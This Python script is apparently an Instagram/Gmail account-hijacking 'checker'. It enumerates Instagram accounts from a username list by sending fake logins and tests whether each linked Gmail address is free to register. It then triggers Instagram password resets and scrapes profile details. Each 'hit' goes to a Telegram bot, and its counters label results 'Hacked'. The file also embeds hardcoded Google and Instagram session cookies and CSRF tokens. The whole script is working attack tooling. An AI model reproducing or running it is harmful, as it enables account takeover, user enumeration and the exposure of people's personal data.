import requests
import time
import os 
from user_agent import generate_user_agent
import socket
import datetime
from uuid import uuid4
import json
ip =socket.gethostname()
ip1 = socket.gethostbyname(ip)
a=0
j=0
b=0
s=0
day = datetime.date.today()
list = []

##################################
def gmail1():
    took =input('\033[1;33m[>] \033[1;31m- \033[1;37mEnter \033[1;32mYour Token \033[1;37mBot \033[1;31m: ')
    idddd =input('\033[1;35m[>] \033[1;31m- \033[1;37mEnter \033[1;32mYour ID \033[1;37mAccouint \033[1;31m: ')
    os.system('clear')
    fi2 = input('\033[1;32mEnter Your File name read in Tool : ')
    if ('.txt') in fi2:
        
        global a,b,s,j
        fil = open('username.txt','r').read().splitlines()
        for email in fil:
            if ('@') in email:
                email = email.split('@')[0]
            url = 'https://b.i.instagram.com/api/v1/accounts/login/'

            headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
            uid = str(uuid4())
            data = {
                    'uuid':uid, 
                    'password':'ffffdddddaaa666', 
                    'username':'{}@gmail.com' .format(email),
                    'device_id':uid, 
                    'from_reg':'false', 
                    '_csrftoken':'missing', 
                    'login_attempt_countn':'0'
                }
            try:
                re = requests.post(url,headers=headers,data=data).text
                
            except requests.exceptions.ConnectionError as error:
                continue
            print(re)
            if('"invalid_user"')in re:
                b+=1
                os.system('cls'if os.name=='nt'else'clear')
                print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')
            elif ('"bad_password"') in re:
                url = 'https://android.clients.google.com/setup/checkavail'
                headers = {
                    'Content-Length':'98',
                    'Content-Type':'text/plain; charset=UTF-8',
                    'Host':'android.clients.google.com',
                    'Connection':'Keep-Alive',
                    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
                data= json.dumps({
                    'username':f'{email}@gmail.com',
                    'version':'3',
                    'firstName':'AbaLahb',
                    'lastName':'AbuJahl'})
                try:
                    res=requests.post(url,headers=headers,data=data)
                except requests.exceptions.ConnectionError as error:
                    continue
                
                

                
                       
           

                if res.json()['status'] == 'SUCCESS':


                    nn = email
                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(nn)
                    head2={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                        'x-instagram-ajax': '1006627630',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    try:

                        ge = requests.get(url2,headers=head2).json()
                    except requests.exceptions.ConnectionError as error:
                        continue
                    print(ge)
                    try:

                        id = ge['data']['user']['id']
                        fol = ge['data']['user']['edge_followed_by']['count']
                        bio = ge['data']['user']['biography']
                        fols = ge['data']['user']['edge_follow']['count']
                       
                        nam = ge['data']['user']['full_name']
                    except KeyError as error :
                        b+=1
                        os.system('cls'if os.name=='nt'else'clear')
                        print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n') 
                    a+=1
                    os.system('cls'if os.name=='nt'else'clear')
                    print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')     
                    rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                    ree = rl.json()
                    da = ree['date']
                    headers1 = {
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                    }
                    data3 = {
                        'ig_sig_key_version': '4',
                        "user_id":id
                    }
                    try:
                        res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                        try:
                            rs =str(res['obfuscated_email'])
                        except KeyError as error:
                            b+=1
                    except requests.exceptions.ConnectionError as error:
                        continue
                    j+=1
                    try:
                        try:
                            lm = f'✓ 𝙷𝙸𝚃 : {j}\n✓ 𝙵𝙺𝙻𝙻 𝙽𝙰𝙼𝙴 : {nam}\n✓ 𝙺𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {nn}\n✓ 𝙴𝙼𝙰𝙸𝙻 : {email}@gmail.com\n✓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 : {fols}\n✓ 𝙵𝙾𝙻𝙻𝚆𝙴𝚁𝚂:: {fol}\n✓ 𝙱𝙸𝙾 : {bio}\n✓ 𝙺𝚂𝙴𝚁 𝙸𝙳 : {id}\n✓ 𝚁𝙴𝚂𝚃 : {rs}\n✓ 𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃 : {da}\n✓ 𝙱𝚈 : @BBMZZ - #zaid_kareem'
                            tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={lm}')
                            ru= requests.post(tlg)
                            with open('trueinstagram.txt','a') as f8:
                                f8.write(f'{email}\n')
                        except UnboundLocalError as error:
                            b+=1
                    except requests.exceptions.ConnectionError as error:
                        continue
                else:
                    s+=1
                    os.system('cls'if os.name=='nt'else'clear')
                    print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')
    else:
     
        os.system('cls' if os.name=='nt'else'clear')
        tru = input('Try again..? y/n ?').lower()
        if tru =='y':
            gmail()
        elif tru=='n':
            os.system('cls' if os.name=='nt'else'clear')
            print('exit... True ')
            exit()
        else:
            print('Error Choice....\n')
            os.system('cls' if os.name=='nt'else'clear')
            gmail()

######################################################
def gmail():
    took =input('\033[1;33m[>] \033[1;31m- \033[1;37mEnter \033[1;32mYour Token \033[1;37mBot \033[1;31m: ')
    idddd =input('\033[1;35m[>] \033[1;31m- \033[1;37mEnter \033[1;32mYour ID \033[1;37mAccouint \033[1;31m: ')
    
    global a,b,s,j
    os.system('cls' if os.name=='nt'else'clear')
    fik = input('\033[1;32m>> Enter Your File read Tool : ')
    if ('.txt') in fik:
        
        fil = open(fik,'r').read().splitlines()
        for email in fil:
            url ='https://www.instagram.com/api/v1/web/accounts/login/ajax/'

            head1 = {
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-length': '291',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=iMd8tAhvwezltsWZAVi1adkaSyB7EUzO; ds_user_id=58173081681; shbid="12243\05458173081681\0541711782047:01f709696fd88f95ae617bb02b5b6d15a9e8996d88f9e2d3ee8855533aedb9f4987abd92"; shbts="1680246047\05458173081681\0541711782047:01f7d73e9f512a0f35a524df1d0f51b48fcb0023309d321cfb9c3f54c755152397f7da58"; fbsr_124024574287414=LLfGuxN7PwilAJQ2w2bGqQmOX6p3T2JreIplqK1mKOo.eyJ1c2VyX2lkIjoiMTAwMDY0NTIzMTU1MTczIiwiY29kZSI6IkFRRFRUem5mcW1BRUJDbGZHcjJSWWV5UERTd3RhSEJTM2lsTERTaUdXZF9fTHdCaFp2VV9ndVltWEJINE9DenUxamJCbWh3TWtSVmdUOXRyWDVWTHlpcGFFY01fMFlSb3pHOVRibWE0NkRMMm9GTE9FWmJhdzhSNF84c2hDZl9FZGtwb2V4MmtSYTIzNm8xa3A2LWFzZGNRVVk4eVFSU3NwQzlhaEI4NFBYWk1FMVA4aUt5aEIzWGlXOGxjaGJ0Y1R2WEdsUnRBNl91MnlCNExxN09PRjdXZG1DT2p6c2lBM3BsZEY4X2FjX181OGpTUDBTSC1DS0dQMHZYYldlaVBDSWs2ell4SGtkRmNTVkdIUE5sTDB3aUk4azBNcVdSbl9nbXk5RWptV282dmRBQlpVTTVabmJwYXFOT2dLem9ndzRDU2x4WUI3clQtUzdjaWJUbGNqWTlZIiwib2F1dGhfdG9rZW4iOiJFQUFCd3pMaXhuallCQUVsVmlXS2JhMkJlRTEwSlBoS01iNVVsdFlhYUlKY05zZVdZWkFodFpCWkNUcElmOTZrNk9nTE9mTnZ1RjdMcUs5WkMyUk1NUWxCQXJPNzVuWkE3U3JLcEtLR3JsRDFEMU5QOWZ5MkxNZkQzeHNINGpMeG9tQUtoRGRnUW1Ea2dzNk10TFNVSEVQbVJFWkFXZkJ5Y1pDbGZmTmp5eGR5U1Jtb3JyN1N2SXN4Y3g2OTdxSVZSSXNaRCIsImFsZ29yaXRobSI6IkhNQUMtU0hBMjU2IiwiaXNzdWVkX2F0IjoxNjgwNTQwMzI3fQ',
                    'sec-ch-prefers-color-scheme': 'light',
                    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
            
                    'user-agent': '{}'.format(generate_user_agent()),
                    'x-csrftoken': 'iMd8tAhvwezltsWZAVi1adkaSyB7EUzO',
                    'x-ig-app-id': '936619743392459',
                    'x-ig-www-claim': '0',
                    'x-instagram-ajax': '1007230059',
                    'x-requested-with': 'XMLHttpRequest'
            }
            tim = str(time.time()).split('.')[0]
            data = {
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:wjdjwdjwjdwjdjwdj1212',
                'username': f'{email}@gmail.com',
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'trustedDeviceRecords': '{}'
            }
            try:
                try:
                    
                    rf = requests.post(url,headers=head1,data=data).text
                except requests.exceptions.ReadTimeout as error:
                    continue
                
            except requests.exceptions.ConnectionError as error:
                continue
        
            if ('"Sorry, your password was incorrect. Please double-check your password."') in rf:
                b+=1
                os.system('cls'if os.name=='nt'else'clear')
                print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')
            elif ('"Sorry, there was a problem with your request.') in rf:
                time.sleep(5)
            elif ('"user":true,') in rf:
                url = 'https://android.clients.google.com/setup/checkavail'
                headers = {
                    'Content-Length':'98',
                    'Content-Type':'text/plain; charset=UTF-8',
                    'Host':'android.clients.google.com',
                    'Connection':'Keep-Alive',
                    'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
                data= json.dumps({
                    'username':f'{email}@gmail.com',
                    'version':'3',
                    'firstName':'AbaLahb',
                    'lastName':'AbuJahl'})
                try:
                    res=requests.post(url,headers=headers,data=data)
                except requests.exceptions.ConnectionError as error:
                    continue
                
                

                
                       
           

                if res.json()['status'] == 'SUCCESS':


                    nn = email
                    with open('trueinstagram.txt','a') as f8:
                        f8.write(f'{email}\n')
                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(nn)
                    head2={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                        'x-instagram-ajax': '1006627630',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    try:

                        ge = requests.get(url2,headers=head2).json()
                    except requests.exceptions.ConnectionError as error:
                        continue
                   
                    try:

                        id = ge['data']['user']['id']
                        fol = ge['data']['user']['edge_followed_by']['count']
                        bio = ge['data']['user']['biography']
                        fols = ge['data']['user']['edge_follow']['count']
                       
                        nam = ge['data']['user']['full_name']
                    except KeyError as error :
                        b+=1
                        os.system('cls'if os.name=='nt'else'clear')
                        print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n') 
                    a+=1
                    os.system('cls'if os.name=='nt'else'clear')
                    print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')     
                    rl = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                    ree = rl.json()
                    da = ree['date']
                    headers1 = {
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                    }
                    data3 = {
                        'ig_sig_key_version': '4',
                        "user_id":id
                    }
                    try:
                        res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                        try:
                            rs =str(res['obfuscated_email'])
                        except KeyError as error:
                            b+=1
                    except requests.exceptions.ConnectionError as error:
                        continue
                    j+=1
                    try:
                        uss = (nn)
                        lm = len(nn)
                        xj = lm-1
                        print(lm)
                        jx =uss[0]
                        jxx =uss[xj]
                        try:

                            kc = res[0]
                            k1 = res[8]
                        except (UnboundLocalError,KeyError) as error:
                            lm = f'✓ 𝙷𝙸𝚃 : {j}\n✓ 𝙵𝙺𝙻𝙻 𝙽𝙰𝙼𝙴 : {nam}\n✓ 𝙺𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {nn}\n✓ 𝙴𝙼𝙰𝙸𝙻 : {email}@gmail.com\n✓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 : {fols}\n✓ 𝙵𝙾𝙻𝙻𝚆𝙴𝚁𝚂:: {fol}\n✓ 𝙱𝙸𝙾 : {bio}\n✓ 𝙺𝚂𝙴𝚁 𝙸𝙳 : {id}\n✓ 𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃 : {da}\n✓ Info : لم تتمكن الاداة من كشف المعلومات\n✓ 𝙱𝚈 : @BBMZZ - #zaid_kareem'
                            tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={lm}')
                            ru= requests.post(tlg)
                            continue
                        if (jx)== (kc) and (jxx) ==(k1):
                            try:
                                lm = f'✓ 𝙷𝙸𝚃 : {j}\n✓ 𝙵𝙺𝙻𝙻 𝙽𝙰𝙼𝙴 : {nam}\n✓ 𝙺𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {nn}\n✓ 𝙴𝙼𝙰𝙸𝙻 : {email}@gmail.com\n✓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 : {fols}\n✓ 𝙵𝙾𝙻𝙻𝚆𝙴𝚁𝚂:: {fol}\n✓ 𝙱𝙸𝙾 : {bio}\n✓ 𝙺𝚂𝙴𝚁 𝙸𝙳 : {id}\n✓ 𝚁𝙴𝚂𝚃 : {rs}\n✓ 𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃 : {da}\n✓ Info : معلومات الحساب صحيحة\n✓ 𝙱𝚈 : @BBMZZ - #zaid_kareem'
                                tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={lm}')
                                ru= requests.post(tlg)
                                
                            except UnboundLocalError as error:
                                b+=1
                        else:
                            lm = f'✓ 𝙷𝙸𝚃 : {j}\n✓ 𝙵𝙺𝙻𝙻 𝙽𝙰𝙼𝙴 : {nam}\n✓ 𝙺𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {nn}\n✓ 𝙴𝙼𝙰𝙸𝙻 : {email}@gmail.com\n✓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 : {fols}\n✓ 𝙵𝙾𝙻𝙻𝚆𝙴𝚁𝚂:: {fol}\n✓ 𝙱𝙸𝙾 : {bio}\n✓ 𝙺𝚂𝙴𝚁 𝙸𝙳 : {id}\n✓ 𝚁𝙴𝚂𝚃 : {rs}\n✓ 𝙳𝙰𝚃𝙰 𝙰𝙲𝙲𝙾𝙺𝙸𝙽𝚃 : {da}\n✓ Info : معلومات الحساب خطأ\n✓ 𝙱𝚈 : @BBMZZ - #zaid_kareem'
                            tlg =(f'https://api.telegram.org/bot{took}/sendMessage?chat_id={idddd}&text={lm}')
                            ru= requests.post(tlg)
                    except requests.exceptions.ConnectionError as error:
                        continue
                else:
                    s+=1
                    os.system('cls'if os.name=='nt'else'clear')
                    print(f'\033[1;37mHacked : \033[1;32m{a} \033[1;34m- \033[1;37mBad Gmail : \033[1;31m{s} \033[1;34m- \033[1;37mBad Instagram : \033[1;33m{b}\n')
    else:
        os.system('cls' if os.name=='nt'else'clear')
        tru = input('Try again..? y/n ?').lower()
        if tru =='y':
            gmail()
        elif tru=='n':
            os.system('cls' if os.name=='nt'else'clear')
            print('exit... True ')
            exit()
        else:
            print('Error Choice....\n')
            os.system('cls' if os.name=='nt'else'clear')
            gmail()
            
                
def yahoo():
    global a
    file2 = open('username.txt','r').read().splitlines()
    for email in file2:

        url = 'https://accounts.google.com/_/signup/webusernameavailability?hl=ar&_reqid=475082&rt=j'
        nm = email.split('@')[0]
        head1={
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '1190',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'cookie': 'SEARCH_SAMESITE=CgQI25YB; HSID=AqVNcLgtyV8qACjl5; SSID=AiNW8hZgJ42pJTUj2; APISID=QWpcaMriU0QKLpYp/AjC54ZWtOzRENNgX8; SAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; __Secure-1PAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; __Secure-3PAPISID=LqcjEhMfwwod0peC/ASthFc-DLSuwHFIDv; ACCOUNT_CHOOSER=AFx_qI7F0xHvZRK8KJSe6tz0NrURnzUEwvN4MMYPRIaZwiFyANVBF9uXlDYL9kF-1j0wyelu_fqr153ri1ORaLKdhjv9B1zqV7Nttlu5qLcSiavoIiKPs5nvt0qNp53Dp9hekTjqZYaGdtk77UEMCPU6VvKzK2n5gtttlAA9IOUPjJgDQtAva4IgwfZzC6Qjng-FhLmXvSwi2aSXMMr_HGpvUGryFOfY2dhl-w3_AwnjgNIs0xJyB3GAXLCGNG1p7xjlrlJ3j35czk-j8AZgbsSWDDYsa8m-pw; SID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7H7toj2PuG1CT7RYZ656tzA.; __Secure-1PSID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7ZskS6AGBqxv4R7sFByoTgw.; __Secure-3PSID=QQinNBE3wCqaVGDFkih0cNS1H1HZD3Pk-Ny7XsE7frXAXdy7bylvFXShcOWp8xEMoyRYAQ.; LSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqvnwzyEOsjtpz_Xv3YGSMkw.; __Host-1PLSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqVJM2Mjba_0rnj_DpK7-GcQ.; __Host-3PLSID=o.chat-dl.google.com|o.gds.google.com|o.mail.google.com|o.myaccount.google.com|s.IQ:QQinNFLhvT2BUSFcOIx2xrnksZKC_b-Ys7tFvr_gyKcMtXTqUMoH-tlvVsLba3TIeM8xLg.; 1P_JAR=2022-11-28-17; AEC=AakniGOQHd2YtABZyBR9LGAvOJLjp0xkZ0OPqzrGu6LFT9KbKQTFodmOHg; __Host-GAPS=1:aBoUpYnr12jBFZ_iZDrKVMeNlWM4mjudwFahtCfp5keaEDllyjeCv7YgFni40L0SP85ivw99bMXSROFGUyBFjTB0R1wbFg:8Q3DBwhkEFgTBkRb; NID=511=i7bHDBHZU1IVY6Tux4JU0SZx6J9Pl9grdAYnPr_orMAmES5xzdwRm4EGhIFG8fQ3NiIYMRZW3wUzfa71g2LKw9rjov4HgZtW_PhYxdPQVOK1NZIIdRRGvV1gcyDL81lpEPM7UdDBPSf85v0Z3nIG7aU7iqBag1oR90lU5rLjvXLfYe2rIiW6kLaAfeTv94xqGE8hJyDWGAeiRskQ1zjH4T5bHy6SWVHkcqF_ABaAGkFyb7qzr1_aPjyZd2plSxPtras2HvxCue22Quz1EKY2MKitEyt61VX_CPQMmpZCasXmHhO6w-p_UEYoeQNUX14IvzBu8HCAE_DzTkMpdwhhRq8Dp2Dxy6ZTmfhvIi12SxgIVkgFiYq1hKzAQEI; SIDCC=AIKkIs1N81QwhWri0Bzm-vrZd8ZdIcJEwQhxW5Nq6Fz0ZGYet75_HxakoP7e7FCuuwygEHCFBA; __Secure-1PSIDCC=AIKkIs1zz7mbkrfHGeL2Kc6ha56DRIcm394O1QHjGydZ6iK2E07-NUbA4qBrmwETMvxL9yu71w; __Secure-3PSIDCC=AIKkIs2nVxwPe7zp6d3FIM80oZYUYY-pWAGBtpDrCIFpORKRPEJkQenJ1ZEXQqvUst5tgIW-U70',
            'google-accounts-xsrf': '1',
            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/signup/v2/webcreateaccount?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2Fdeleteaccount&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp',
            'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'x-chrome-id-consistency-request': 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=84bf7e62-6751-416e-bb03-1edc3d7c194a,signin_mode=all_accounts,signout_mode=show_confirmation',
            'x-client-data': 'CIi2yQEIo7bJAQjEtskBCKmdygEIqJbLAQiTocsBCMXhzAEIlenMAQjl68wBCO7tzAEI8/HMAQiM98wBCM35zAEI0PrMAQik+8wBCKn8zAEIwIqrAg==',

            'x-same-domain': '1'
        }
        data1 ={
            'continue': 'https://myaccount.google.com/deleteaccount',
            'service': 'accountsettings',
            'f.req': f'["TL:ADFpJfN4RVRp-IIIn2iZfL88X6EJH_mnJCHatuWdaugBEMaMnfVIlVYDyuILuNJV","zaa","fdf","{email}",false,"S302716898:1669657854848764",1]',
            'at': 'AFoagUW3jURSo46O8KfZ96FjJv613X4xRg:1669657854874',
            'azt': 'AFoagUVcdDPp0WLYJ4W-HDpm0Y9Y_TkciQ:1669657854874',
            'cookiesDisabled': 'false',
            'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"84bf7e62-6751-416e-bb03-1edc3d7c194a",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,false,1,""]',
            'gmscoreversion': 'undefined'

        }

        res = requests.post(url,data=data1,headers=head1).text
        if ('"gf.wuar",2') in res:
            a+=1
            print(f'The Email No : {a}')
        elif ('"EmailInvalid"') in res:
            a+=1
            print(f'The Email Not : {a}')
        elif ('"gf.wuar",1') in res:
            a+=1
            print(f'The Email True : {a}')


def login():
    username = input('\033[1;32mEnter Your usernaem : ')
    pasw = input('\033[1,32mEnter Your Password : ')
    url ='https://www.instagram.com/api/v1/web/accounts/login/ajax/'

    head = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '291',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'ig_did=735BE103-DEB8-49AD-8E6E-09C8DDAB8696; ig_nrcb=1; mid=Y0rdDwALAAF9nAJ20ejltiX0xwPD; datr=mt5KY8cDTj42n9H2F-WvsM6M; fbm_124024574287414=base_domain=.instagram.com; csrftoken=3x61mpjHJv4QQhugwS2lvBGqsWQuQYFa; ds_user_id=499476691',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'x-csrftoken': '3x61mpjHJv4QQhugwS2lvBGqsWQuQYFa',
        'viewport-width': '917'
    }
    tim = str(time.time()).split('.')[0]
    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{pasw}',
        'username': f'{username}',
        'queryParams': '{}',
        'optIntoOneTap': 'false',
        'trustedDeviceRecords': '{}'
    }
    rf = requests.post(url,headers=head,data=data)
    if ('"userId"') in rf.text:
        co = rf.cookies
        coo = co.get_dict()
        sessoin = coo['sessionid']
        print(sessoin)
    elif ('"checkpoint_url"') in rf.text:
        print('\033[1;33mSecuer')
    elif ('"user":true,"authenticated":false') in rf.text:
        print('\033[1;31mPassword False')
        
        
        

#########################################################################################333
print('\033[1;37mGmail \033[1;32mTool \033[1;37mFree \033[1;33m1\033[1;31m.\033[1;33m2 \033[1;31m, \033[1;32m@BBMZZ - @zaidkarrem')
print('[1] - Checker\n[2] - Checker api[2]\n[3] - Remove list users\n[0] - Remove List')
inp = str(input('[-] Enter Your :'))
os.system('cls' if os.name=='nt'else'clear')
if inp=='1':
    os.system('cls'if os.name=='nt'else'clear')
    gmail()
elif inp =='2':
    gmail1()
elif inp=='3':
    #list = []
    txt2='ui.txt'
    txt1 = 'username.txt'
    fil = open(txt1,'r').readlines()
    for i in fil:
        if i in fil and i not in list :
            list.append(i)
    with open(txt2,'w') as F9:
        for u in list:
            F9.write(u)
        F9.close()
elif inp=='0':
    os.remove('username.txt')
    print('Done Remove List .')
else:
    
    print('choice Error')
